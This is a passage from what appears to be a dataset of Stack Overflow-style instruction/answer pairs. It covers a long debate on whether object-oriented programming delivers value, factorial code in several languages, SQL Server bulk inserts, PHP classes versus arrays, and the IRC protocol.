you want.\nFrom the TSpectrum class documentation:\nThe algorithms used in this class have been published in the following references:\n\n[1] M.Morhac et al.: Background\n  elimination methods for\n  multidimensional coincidence gamma-ray\n  spectra. Nuclear Instruments and\n  Methods in Physics Research A 401\n  (1997) 113-\n  132.\n[2]  M.Morhac et al.: Efficient one- and two-dimensional Gold\n  deconvolution and its application to\n  gamma-ray spectra decomposition.\n  Nuclear Instruments and Methods in\n  Physics Research A 401 (1997) 385-408.\n[3]  M.Morhac et al.: Identification of peaks in\n  multidimensional coincidence gamma-ray\n  spectra. Nuclear Instruments and\n  Methods in Research Physics A \n  443(2000), 108-125.\n\nThe papers are linked from the class documentation for those of you who don't have a NIM online subscription.\n\nThe short version of what is done is that the histogram flattened to eliminate noise, and then local maxima are detected by brute force in the flattened histogram."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Verging on religious but I would say that you're painting an overly grim picture of the state of modern OOP. I would argue that it actually has reduced costs, made large software projects manageable, and so forth. That doesn't mean it's solved the fundamental problem of software messiness, and it doesn't mean the average developer is an OOP expert. But the modularization of function into object-components has certainly reduced the amount of spaghetti code out there in the world.\nI can think of dozens of libraries off the top of my head which are beautifully reusable and which have saved time and money that can never be calculated.\nBut to the extent that OOP has been a waste of time, I'd say it's because of lack of programmer training, compounded by the steep learning curve of learning a language specific OOP mapping. Some people \"get\" OOP and others never will."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed\n\nWhile this is true and has been observed by other people (take Stepanov, inventor of the STL), the rest is nonsense. OOP may be flawed and it certainly is no silver bullet but it makes large-scale applications much simpler because it's a great way to reduce dependencies. Of course, this is only true for \u201cgood\u201d OOP design. Sloppy design won't give any advantage. But good, decoupled design can be modelled very well using OOP and not well using other techniques.\nThere are much better, more universal models (Haskell's type model comes to mind) but these are also often more complicated and/or difficult to implement efficiently. OOP is a good trade-off between extremes."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "I have been writing OO code for the last 9 years or so.  Other than using messaging, it's hard for me to imagine other approach.  The main benefit I see totally in line with what CodingTheWheel said: modularisation.  OO naturally leads me to construct my applications from modular components that have clean interfaces and clear responsibilities (i.e. loosely coupled, highly cohesive code with a clear separation of concerns).  \nI think where OO breaks down is when people create deeply nested class heirarchies.  This can lead to complexity.  However, factoring out common finctionality into a base class, then reusing that in other descendant classes is a deeply elegant thing, IMHO!"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "@CodingTheWheel\n\nBut to the extent that OOP has been a waste of time, I'd say it's because of lack of programmer training, compounded by the steep learning curve of learning a language specific OOP mapping. Some people \"get\" OOP and others never will.\n\nI dunno if that's really surprising, though.  I think that technically sound approaches (LSP being the obvious thing) make hard to use, but if we don't use such approaches it makes the code brittle and inextensible anyway (because we can no longer reason about it).  And I think the counterintuitive results that OOP leads us to makes it unsurprising that people don't pick it up.\nMore significantly, since software is already fundamentally too hard for normal humans to write reliably and accurately, should we really be extolling a technique that is consistently taught poorly and appears hard to learn? If the benefits were clear-cut then it might be worth persevering in spite of the difficulty, but that doesn't seem to be the case."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "@Sean\n\nHowever, factoring out common finctionality into a base class, then reusing that in other descendant classes is a deeply elegant thing, IMHO!\n\nBut \"procedural\" developers have been doing that for decades anyway.  The syntax and terminology might differ, but the effect is identical.  There is more to OOP than \"reusing common functionality in a base class\", and I might even go so far as to say that that is hard to describe as OOP at all; calling the same function from different bits of code is a technique as old as the subprocedure itself."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "@Konrad\n\nOOP may be flawed and it certainly is no silver bullet but it makes large-scale applications much simpler because it's a great way to reduce dependencies\n\nThat is the dogma. I am not seeing what makes OOP significantly better in this regard than procedural programming of old. Whenever I make a procedure call I am isolating myself from the specifics of the implementation."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "\"Even if there is no actual [information architecture], it doesn\u2019t mean we don\u2019t experience or perceive it as such. Zen Buddhists say there is no actual \u201cself\u201d but they still name their kids.\"-Andrew Hinton"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Its a programming paradigm.. Designed to make it easier for us mere mortals to break down a problem into smaller, workable pieces..\nIf you dont find it useful.. Don't use it, don't pay for training and be happy.\nI on the other hand do find it useful, so I will :)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "D Templates: Functional\ntemplate factorial(int n : 1)\n{\n  const factorial = 1;\n}\n\ntemplate factorial(int n)\n{\n  const factorial =\n     n * factorial!(n-1);\n}\n\nor \ntemplate factorial(int n)\n{\n  static if(n == 1)\n    const factorial = 1;\n  else \n    const factorial =\n       n * factorial!(n-1);\n}\n\nUsed like this:\nfactorial!(5)"}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "Python:\nRecursive\ndef fact(x): \n    return (1 if x==0 else x * fact(x-1))\n\nUsing iterator\nimport operator\n\ndef fact(x):\n    return reduce(operator.mul, xrange(1, x+1))"}
{"instruction": "I am hitting some performance bottlenecks with my C# client inserting bulk data into a SQL Server 2005 database and I'm looking for ways in which to speed up the process.\nI am already using the SqlClient.SqlBulkCopy (which is based on TDS) to speed up the data transfer across the wire which helped a lot, but I'm still looking for more.\nI have a simple table that looks like this: \n CREATE TABLE [BulkData](\n [ContainerId] [int] NOT NULL,\n [BinId] [smallint] NOT NULL,\n [Sequence] [smallint] NOT NULL,\n [ItemId] [int] NOT NULL,\n [Left] [smallint] NOT NULL,\n [Top] [smallint] NOT NULL,\n [Right] [smallint] NOT NULL,\n [Bottom] [smallint] NOT NULL,\n CONSTRAINT [PKBulkData] PRIMARY KEY CLUSTERED \n (\n  [ContainerIdId] ASC,\n  [BinId] ASC,\n  [Sequence] ASC\n))\n\nI'm inserting data in chunks that average about 300 rows where ContainerId and BinId are constant in each chunk and the Sequence value is 0-n and the values are pre-sorted based on the primary key.  \nThe %Disk time performance counter spends a lot of time at 100% so it is clear that disk IO is the main issue but the speeds I'm getting are several orders of magnitude below a raw file copy.\nDoes it help any if I:\n\nDrop the Primary key while I am doing the inserting and recreate it later\nDo inserts into a temporary table with the same schema and periodically transfer them into the main table to keep the size of the table where insertions are happening small\nAnything else?\n\n--\nBased on the responses I have gotten, let me clarify a little bit:\nPortman: I'm using a clustered index because when the data is all imported I will need to access data sequentially in that order.  I don't particularly need the index to be there while importing the data.  Is there any advantage to having a nonclustered PK index while doing the inserts as opposed to dropping the constraint entirely for import?\nChopeen:  The data is being generated remotely on many other machines (my SQL server can only handle about 10 currently, but I would love to be able to add more).  It's not practical to run the entire process on the local machine because it would then have to process 50 times as much input data to generate the output.\nJason: I am not doing any concurrent queries against the table during the import process, I will try dropping the primary key and see if that helps.", "output": "I think that it sounds like this could be done using SSIS packages. They're similar to SQL 2000's DTS packages. I've used them to successfully transform everything from plain text CSV files, from existing SQL tables, and even from XLS files with 6-digit rows spanned across multiple worksheets. You could use C# to transform the data into an importable format (CSV, XLS, etc), then have your SQL server run a scheduled SSIS job to import the data.\nIt's pretty easy to create an SSIS package, there's a wizard built-into SQL Server's Enterprise Manager tool (labeled \"Import Data\" I think), and at the end of the wizard it gives you the option of saving it as an SSIS package. There's a bunch more info on Technet as well."}
{"instruction": "Which is better to use in PHP, a 2D array or a class? I've included an example of what I mean by this.\n// Using a class\nclass someClass\n{\n    public  $name;\n    public  $height;\n    public  $weight;\n\n    function __construct($name, $height, $weight)\n    {\n        $this -> name       = $name;\n        $this -> height = $height;\n        $this -> weight = $weight;\n    }\n}\n\n$classArray[1] = new someClass('Bob', 10, 20);\n$classArray[2] = new someClass('Fred', 15, 10);\n$classArray[3] = new someClass('Ned', 25, 30);\n\n\n// Using a 2D array\n$normalArray[1]['name'] = 'Bob';\n$normalArray[1]['height']   = 10;\n$normalArray[1]['weight']   = 20;\n\n$normalArray[2]['name'] = 'Fred';\n$normalArray[2]['height']   = 15;\n$normalArray[2]['weight']   = 10;\n\n$normalArray[3]['name'] = 'Ned';\n$normalArray[3]['height']   = 25;\n$normalArray[3]['weight']   = 30;\n\n\nAssuming that somebody doesn't come out and show that classes are too slow, it looks like class wins.\nI've not idea which answer I should accept to I've just upvoted all of them.\n\nAnd I have now written two near identical pages, one using the 2D array (written before this question was posted) and now one using a class and I must say that the class produces much nicer code. I have no idea how much overhead is going to be generated but I doubt it will rival the improvement to the code itself.\nThank you for helping to make me a better programmer.", "output": "If your code uses lot of functions that operate on those attributes (name/height/weight), then using class could be a good option."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "Relative to straight procedural programming, the first fundamental tenet of OOP is the notion of information hiding and encapsulation. This idea leads to the notion of the class that seperates the interface from implementation. These are hugely important concepts and the basis for putting a framework in place to think about program design in a different way and better (I think) way. You can't really argue against those properties - there is no trade-off made and it is always a cleaner way to modulize things.\nOther aspects of OOP including inheritance and polymorphism are important too, but as others have alluded to, those are commonly over used. ie: Sometimes people use inheritance and/or polymorphism because they can, not because they should have. They are powerful concepts and very useful, but need to be used wisely and are not automatic winning advantages of OOP.\nRelative to re-use. I agree re-use is over sold for OOP. It is a possible side effect of well defined objects, typically of more primitive/generic classes and is a direct result of the encapsulation and information hiding concepts. It is potentially easier to be re-used because the interfaces of well defined classes are just simply clearer and somewhat self documenting."}
{"instruction": "I started using IRC at a young age, and I have always been fascinated with it.  As a language exercise, I was thinking about programming a simple IRC client in Ruby with Shoes as a graphical front-end.  My question to you, kind-sirs, what do I need to become familiar with to start on this great adventure (besides shoes and Ruby of course)?  I imagine there is some-sort of specification on IRC Protocol.  Any pointers?", "output": "The IRC Specification is laid out in RFC 1459\nhttp://www.irchelp.org/irchelp/rfc/rfc.html"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "@Jeff\n\nRelative to straight procedural programming, the first fundamental tenet of OOP is the notion of information hiding and encapsulation. This idea leads to the notion of the class that seperates the interface from implementation.\n\nWhich has the more hidden implementation: C++'s iostreams, or C's FILE*s?\nI think the use of opaque context objects (HANDLEs in Win32, FILE*s in C, to name two well-known examples--hell, HANDLEs live on the other side of the kernel-mode barrier, and it really doesn't get much more encapsulated than that) is found in procedural code too; I'm struggling to see how this is something particular to OOP.\nI suppose that may be a part of why I'm struggling to see the benefits: the parts that are obviously good are not specific to OOP, whereas the parts that are specific to OOP are not obviously good! (this is not to say that they are necessarily bad, but rather that I have not seen the evidence that they are widely-applicable and consistently beneficial)."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "OOP has reduced costs, and increased efficiency.\nWhen I made the jump from classic ASP/VBScript to C# I noticed a HUGE increase in productivity thanks to OOP."}
{"instruction": "I started using IRC at a young age, and I have always been fascinated with it.  As a language exercise, I was thinking about programming a simple IRC client in Ruby with Shoes as a graphical front-end.  My question to you, kind-sirs, what do I need to become familiar with to start on this great adventure (besides shoes and Ruby of course)?  I imagine there is some-sort of specification on IRC Protocol.  Any pointers?", "output": "I found this gem on Wikipedia. Sounds intimidating.\n\nIt's actually not.\nTelnet onto an IRC Server and witness the simplicity of the protocol first hand. The hardest part is the handshake, after that its very simple."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "I think the use of opaque context objects (HANDLEs in Win32, FILE*s in C, to name two well-known examples--hell, HANDLEs live on the other side of the kernel-mode barrier, and it really doesn't get much more encapsulated than that) is found in procedural code too; I'm struggling to see how this is something particular to OOP.\n\nHANDLEs (and the rest of the WinAPI) is OOP! C doesn't support OOP very well so there's no special syntax but that doesn't mean it doesn't use the same concepts. WinAPI is in every sense of the word an object-oriented framework.\nSee, this is the trouble with every single discussion involving OOP or alternative techniques: nobody is clear about the definition, everyone is talking about something else and thus no consensus can be reached. Seems like a waste of time to me."}
{"instruction": "I want to see all the different ways you can come up with, for a factorial subroutine, or program. The hope is that anyone can come here and see if they might want to learn a new language.\nIdeas:\n\nProcedural\nFunctional\nObject Oriented\nOne liners\nObfuscated\nOddball\nBad Code\nPolyglot\n\nBasically I want to see an example, of different ways of writing an algorithm, and what they would look like in different languages.\nPlease limit it to one example per entry.\nI will allow you to have more than one example per answer, if you are trying to highlight a specific style, language, or just a well thought out idea that lends itself to being in one post.\nThe only real requirement is it must find the factorial of a given argument, in all languages represented.\nBe Creative!\nRecommended Guideline:\n\n# Language Name: Optional Style type\n\n   - Optional bullet points\n\n    Code Goes Here\n\nOther informational text goes here\n\nI will ocasionally go along and edit any answer that does not have decent formatting.", "output": "two of many Mathematica solutions (although ! is built-in and efficient):\n(* returns pure function *)\n(FixedPoint[(If[#[[2]]>1,{#[[1]]*#[[2]],#[[2]]-1},#])&,{1,n}][[1]])&\n\n(* not using built-in, returns pure function, don't use: might build 1..n list *)\n(Times @@ Range[#])&"}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "HANDLEs (and the rest of the WinAPI) is OOP! \n\nAre they, though?  They're not inheritable, they're certainly not substitutable, they lack well-defined classes... I think they fall a long way short of \"OOP\"."}
{"instruction": "As far as I can tell, in spite of the countless millions or billions spent on OOP education, languages, and tools, OOP has not improved developer productivity or software reliability, nor has it reduced development costs. Few people use OOP in any rigorous sense (few people adhere to or understand principles such as LSP); there seems to be little uniformity or consistency to the approaches that people take to modelling problem domains.  All too often, the class is used simply for its syntactic sugar; it puts the functions for a record type into their own little namespace.\nI've written a large amount of code for a wide variety of applications. Although there have been places where true substitutable subtyping played a valuable role in the application, these have been pretty exceptional. In general, though much lip service is given to talk of \"re-use\" the reality is that unless a piece of code does exactly what you want it to do, there's very little cost-effective \"re-use\".  It's extremely hard to design classes to be extensible in the right way, and so the cost of extension is normally so great that \"re-use\" simply isn't worthwhile.\nIn many regards, this doesn't surprise me.  The real world isn't \"OO\", and the idea implicit in OO--that we can model things with some class taxonomy--seems to me very fundamentally flawed (I can sit on a table, a tree stump, a car bonnet, someone's lap--but not one of those is-a chair).  Even if we move to more abstract domains, OO modelling is often difficult, counterintuitive, and ultimately unhelpful (consider the classic examples of circles/ellipses or squares/rectangles).\nSo what am I missing here? Where's the value of OOP, and why has all the time and money failed to make software any better?", "output": "HANDLEs (and the rest of the WinAPI) is OOP!\n\nAre they, though? They're not inheritable, they're certainly not substitutable, they lack well-defined classes... I think they fall a long way short of \"OOP\".\n\nHave you ever created a window using WinAPI? Then you should know that you define a class (RegisterClass), create an instance of it (CreateWindow), call virtual methods (WndProc) and base-class methods (DefWindowProc) and so on. WinAPI even takes the nomenclature from SmallTalk OOP, calling the methods \u201cmessages\u201d (Window Messages).\nHandles may not be inheritable but then, there's final in Java. They don't lack a class, they are a placeholder for the class: That's what the word \u201chandle\u201d means. Looking at architectures like MFC or .NET WinForms it's immediately obvious that except for the syntax, nothing much is different from the 